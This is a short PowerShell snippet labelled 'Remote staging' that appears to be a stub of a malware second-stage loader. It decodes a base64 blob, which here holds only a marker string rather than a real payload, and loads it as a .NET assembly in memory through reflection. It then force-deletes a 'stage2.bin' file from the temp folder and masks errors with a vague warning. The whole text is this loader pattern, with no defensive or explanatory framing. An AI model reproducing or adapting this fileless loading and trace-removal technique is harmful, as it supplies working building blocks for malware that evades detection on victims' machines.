
# Remote staging
try { $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpybmRhdWI3MXYw"); $TransferResult = [Reflection.Assembly]::Load($StageBytes); $TransferResult.GetTypes().Count; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Loader step failed" }
